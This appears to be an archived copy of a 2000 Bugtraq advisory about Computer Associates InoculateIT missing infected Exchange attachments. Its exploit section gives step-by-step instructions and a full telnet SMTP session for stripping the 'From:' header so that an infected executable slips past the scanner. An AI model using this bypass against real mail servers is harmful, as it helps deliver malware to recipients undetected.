@@ -1,0 +1,101 @@
+#SpeeDr00t@Black Falcon<br>#bid1935<p><b><span style="font-size: 18pt;">Computer Associates InoculateIT MS Exchange Agent Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1935/info">info</a><br><a href="http://www.securityfocus.com/bid/1935/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1935/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1935/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1935/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				1935
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Failure to Handle Exceptional Conditions
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 10 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 10 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was first submitted to Bugtraq by Hugo Caye &lt;Hugo@micmac.com.br&gt; on November 10, 2000.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Computer Associates InoculateIT 4.53 <br/>
+<span class="related">
+						
+							+ 
+						
+						Microsoft Exchange Server  5.5<br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	1. Get a message containing any infected attached MIME encoded file. I<br/>simply filtered out via EX to C:\TurfDir sending from outside to EX;<br/><br/>2. Edit the file (I used MS Notepad.exe) and just remove the "From:<br/>..." line from the SMTP header. Something like this:<br/><br/> Remove this line: From: Test &lt;Test@abc.com.br&gt;<br/>To: Joe Bob &lt;jbob@xyz.com.br&gt;<br/>Subject: Test<br/>Date: Mon, 23 Oct 2000 10:59:53 -0200<br/>MIME-Version: 1.0<br/>X-Mailer: Internet Mail Service (5.5.2650.21)<br/>Content-Type: application/x-msdownload;<br/>        name=3D"Fix2001.exe"<br/>Content-Transfer-Encoding: base64<br/>Content-Disposition: attachment;<br/>        filename=3D"Fix2001.exe"<br/><br/>TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br/>AAAAAAAAAAsAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g<br/>aW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABjDAXbJ21riCdta4gnbWuIJ21riGRta4ikcWWIJm<br/>1riFJpY2gnbWuIAAAAAAAAAABQRQAATAEDAJ/L0zcAAAAAAAAAAOAADwELAQUMABoAAAAA<br/>AgAAAAAAABAAAAAQAAAAMAAA... <br/><br/>3. Copy the Notepad content to clipboard;<br/><br/>4. Issue "telnet your_exsrvr 25" command:<br/><br/>220 aaa.xyz.com.br ESMTP Server (Microsoft Exchange Internet Mail<br/>Service 5.5.2650.21) ready<br/>helo<br/>250 OK<br/>mail from:&lt;&gt;<br/>250 OK - mail from &lt;&gt;<br/>rcpt to:&lt;jbob@xyz.com.br&gt;<br/>250 OK - Recipient &lt;jbob@xyz.com.br&gt;<br/>data<br/>354 Send data.  End with CRLF.CRLF<br/><br/>Here, paste from clipboard (Win2K, just a mouse right-click).<br/>Something like this:<br/><br/>To: Joe Bob &lt;jbob@xyz.com.br&gt;<br/>Subject: Test<br/>Date: Mon, 23 Oct 2000 10:59:53 -0200<br/>MIME-Version: 1.0<br/>X-Mailer: Internet Mail Service (5.5.2650.21)<br/>Content-Type: application/x-msdownload;<br/>        name=3D"Fix2001.exe"<br/>Content-Transfer-Encoding: base64<br/>Content-Disposition: attachment;<br/>        filename=3D"Fix2001.exe"<br/><br/>TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br/>AAAAAAAAAAsAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g<br/>aW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABjDAXbJ21riCdta4gnbWuIJ21riGRta4ikcWWIJm<br/>1riFJpY2gnbWuIAAAAAAAAAABQRQAATAEDAJ/L0zcAAAAAAAAAAOAADwELAQUMABoAAAAA<br/>AgAAAAAAABAAAAAQAAAAMAAA... <br/><br/>250 OK<br/>quit<br/>221 closing connection<br/><br/>5. Message sent, CA's Agent will not detect the infected file.
+	
+		<ul>
+</ul>
+</div>
